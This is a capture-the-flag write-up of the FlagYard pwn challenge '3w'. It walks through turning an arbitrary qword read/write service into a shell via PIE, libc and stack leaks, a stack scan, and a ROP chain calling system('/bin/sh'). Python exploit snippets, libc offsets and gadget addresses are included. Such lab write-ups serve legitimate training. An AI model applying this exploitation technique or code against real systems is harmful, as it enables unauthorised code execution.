# FlagYard CTF — 3w

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** Flagyard
- **Category:** Pwn
- **Difficulty:** Medium (متوسط)

> *"can you turn that power into a shell?"*

---

## The short version

The binary hands us a perfect **arbitrary read / arbitrary write** primitive: menu option `1` reads a qword at any address, option `2` writes a qword at any address. It goes out of its way to leak a pointer in the banner too. The whole game is about *where* to write, because the easy targets are booby-trapped:

1. Banner leaks `win` (`Reference: 0x…`) → **PIE base**.
2. Read `puts@GOT` → **libc base**.
3. Read `environ` → **stack pointer**.
4. Scan the stack to locate **main's frame** (`main_rbp`).
5. A few menu-writes stage a ROP chain in main's frame.
6. One final write smashes **`write_qword`'s own return address** → `ret` → `pop rsi` → `pop rdi` → `/bin/sh` → `system`.
7. Shell → `cat flag`.

**Flag:** `FlagY{65833b23372cd906f73bff581e7dba7c}`

---

## First look

```bash
$ file chall
ELF 64-bit LSB pie executable, x86-64
$ checksec chall
RELRO: Full RELRO   Stack: Canary found   NX: enabled   PIE: enabled
SHSTK: Enabled      IBT: Enabled
```

Full RELRO, canary, NX, PIE — but none of that matters, because the program *volunteers* a write-anything primitive. It also ships its own **glibc 2.39** (`libc.so.6` + `ld-linux-x86-64.so.2`, run via `--library-path .`).

```
Service ready. Reference: 0x555555555f88      <-- leaks win() at +0x1f88
=== 3w - Write-What-Where Service ===
1. Read qword
2. Write qword
3. Exit
```

`win` is a **decoy** — call it and you get `Nothing Here!!!` + `exit(0)`. The real primitive is the menu. `read_u64()` is `fgets` + `strtoul` (hex/decimal both parse), so both prompts accept `0x…` input.

The binary is also spammed with ~40 fake "admin_console/shell_backdoor" functions that print `ok` — pure noise to waste reverse-engineering time. Ignore them.

---

## Leak chain: PIE → libc → stack

`setup()` calls `srand(0xdeadbeef)` and disables buffering. The service then prints `Reference: 0x%lx` with the address of `win`. With a **PIE base = reference − 0x1f88**, the first menu operation (`1`, read) gives:

```python
puts   = rd(io, base + exe.got['puts'])   # puts@GOT at +0x5f90 (readable RELRO)
libc   = puts - 0x87be0                   # puts in this libc
envp0  = rd(io, libc + 0x20ad58)          # environ -> first pointer into argv/envp
```

The weakest point of any stack pivot is where argv/envp are — `environ` points right at them. That gives us a stack pointer almost for free.

---

## Finding main's frame (the scan)

We want to overwrite the **return address of `write_qword`**, which lives 8 bytes past its frame pointer. Because the program *always* returns from `write_qword` to `main+0x21d7`, a tiny stack signature is enough:

```
at slot S:
  [S+8]  == libc + 0x2a1ca     # main's saved RIP (fits in libc text)
  [S-4]  == 1                  # dword: main's current menu choice
  [S]    == a stack pointer    # main's saved rbp
```

Walking down from `envp[0] − 0x90` finds it in a handful of reads:

```python
for k in range(...):
    c = E - 0x90 - k*8
    if libc < rd(c+8) < libc+0x400000 and (rd(c-4) & 0xffffffff) == 1 \
       and 0x700000000000 < rd(c) < 0x800000000000:
        main_rbp = c
```

`envp[0] − main_rbp ≈ 0x138` here, but the scan adapts to any environment, so it's stable on the remote too.

---

## The two traps that *should* have caught us

### Trap #1 — writing "/bin/sh" into `.bss` crashes the program

The most natural write target is the binary's own `.bss` (`+0x6020`)… but that address is where the runtime keeps its **`stdout`/`stdin`/`stderr` `FILE*` globals**:

```
0x55555555a020 <stdout@GLIBC_2.2.5>: 0x00007ffff7e045c0  0x0000000000000000
0x55555555a030 <stdin@GLIBC_2.2.5>:  0x00007ffff7e038e0  0x0000000000000000
```

`write_qword` calls `puts("Done")` *after* every write. Clobbering `stdout` means the very next `puts` dereferences a fake `stdout` → **SIGSEGV**. (Writing to the GOT/RELRO page is read-only too.) So: never write strings into this binary — just point ROP at the `/bin/sh` string **inside libc** (`libc + 0x1cb42f`).

### Trap #2 — main's `sub rsp, 0x10` + choice dword at `[rbp-4]`

The stack geometry around `write_qword`'s frame:

```
main_rbp - 0x18   <- write_qword's saved RIP   (wc_rbp = main_rbp - 0x20)
main_rbp - 0x10   <- main's lost local
main_rbp - 0x8    <- main's free local   ...BUT...
main_rbp - 0x4    <- main stores the menu CHOICE (dword) HERE every loop
main_rbp          <- main's saved rbp
main_rbp + 0x8    <- main's saved RIP (libc + 0x2a1ca)
```

The dword choice at `main_rbp − 4` **overwrites the upper 4 bytes of any qword we place at `main_rbp − 8`**. Put `/bin/sh` there and by trigger time it becomes `0x00000002xxxxxxxx` — a garbage argument (we actually watched `rdi = 0x2f7dcb42f` in gdb: lower bytes of the libc string, upper bytes replaced by the choice `2`).

Fix: **skip that slot with a harmless pop** and hold the real values at/above `main_rbp`, which nothing clobbers:

```
[mr-0x18] ret_gadget        (written LAST = the trigger)
[mr-0x10] pop rsi; ret      (pops the corrupted qword into rsi - we don't care)
[mr-0x00] pop rdi; ret
[mr+0x08] "/bin/sh" address
[mr+0x10] system
```

Gadgets (byte-scan of the provided libc — classic mid-instruction finds):

```python
ret       = libc + 0x2882f    # byte inside abort()          -> ret
pop_rsi   = libc + 0x110a7d   # byte inside waitpid epilogue -> pop rsi; ret
pop_rdi   = libc + 0x10f78b   # byte inside posix_spawn setup-> pop rdi; ret
system    = libc + 0x58750
```

---

## Trigger mechanics and alignment

`write_qword` ends with `mov [rax], rdx ; puts("Done") ; leave ; ret`. If we pre-set the 4 qwords and then use one *last* write to put `ret` at `main_rbp − 0x18`, the flow is:

```
leave -> rsp = wc_rbp            (= main_rbp - 0x20)
pop rbp                         (rsp = main_rbp - 0x18)
ret   -> rip = [mr-0x18] = ret   (rsp = main_rbp - 0x10)  <-- OUR chain starts
```

Consumed qwords, one per gadget:
`[mr-0x10]`=pop_rsi (ret) → rsi = junk from `[mr-0x8]`, rip=`[mr]`
`[mr]`=pop_rdi → rdi = `/bin/sh` (at `[mr+0x8]`), rip=`[mr+0x10]`
`[mr+0x10]`=system → **`system("/bin/sh")`** with `rsp = mr + 0x18 ≡ 8 (mod 16)` — perfectly aligned for a function entry.

The trigger write MUST be the last one; it's also the only one that shouldn't wait for the `> ` prompt (the shell hijacks the tty/pipe right after).

```python
wr(io, mr-0x10, lbase + G_POP_RSI)
wr(io, mr-0x00, lbase + G_POP_RDI)
wr(io, mr+0x08, lbase + LIB_BINSH)
wr(io, mr+0x10, lbase + LIB_SYSTEM)
wr(io, mr-0x18, lbase + G_RET, wait=False)   # trigger

io.sendline(b'cat flag; cat flag.txt; ls -la')
# FlagY{65833b23372cd906f73bff581e7dba7c}
```

---

## Root causes (what actually went wrong)

| Bug | Where | Impact |
|---|---|---|
| Arbitrary qword read | menu `Read qword` | free PIE/libc/stack leaks |
| Arbitrary qword write | menu `Write qword` | free ROP primitive — the challenge *is* the primitive |
| `win` leaked in banner | `main` + `setup` | PIE base in one line |
| `environ` exported | libc | stack pointer for the pivot |
| No bounds / no re-randomization | service | Write-what-where → return address overwrite |
| `write_qword` returns to fixed slot | binary | `main_rbp − 0x18` is always writable |
| libc `/bin/sh` string reachable | libc | no need to write strings anywhere |

> (The decoy `win`, the ~40 "ok" funcs, and the `.bss`-holding-`FILE*` layout are decorations — respect them and skip them.)

---

## Takeaways

- **A write-what-where is game over unless the target can't be reached.** With PIE + libc + stack all leaked, the return address of the menu handler is a free pivot.
- **`environ → envp` is the cheapest stack leak in the game.** It always points at the stack, and libc exports it.
- **"Writable .bss" isn't always safe.** That area held `stdout`/`stdin`/`stderr`; one naive `/bin/sh` write turned the next `puts` into a segfault. Strings already in libc are safer.
- **Main's locals aren't sacred.** A *dword* menu-choice store at `[rbp-4]` silently corrupted our qword at `[rbp-8]`. When a slot keeps getting clobbered, skip it with a junk pop instead of fighting it.
- **Mid-instruction gadgets are fair game.** A `ret` inside `abort`, a `pop rsi; ret` inside `waitpid`'s epilogue — byte-scanning beats living in a gadget-tool world.
- Verify alignment at the *final* jump: one extra `ret` earlier keeps `rsp ≡ 8 (mod 16)` at `system`.

---

## The exploit

Self-contained, colored version in the same folder:

```
3w_solve.py
```

Give it the target interactively (or as a CLI argument) and it walks home:

```bash
python3 3w_solve.py
Enter the 3W challenge target (host:port): tcp.flagyard.com:14160
```

On success it prints the flag panel and saves the flag to
`flag_from_3w.txt` next to the script.

*can you turn that power into a shell?* — I certainly can. 🏁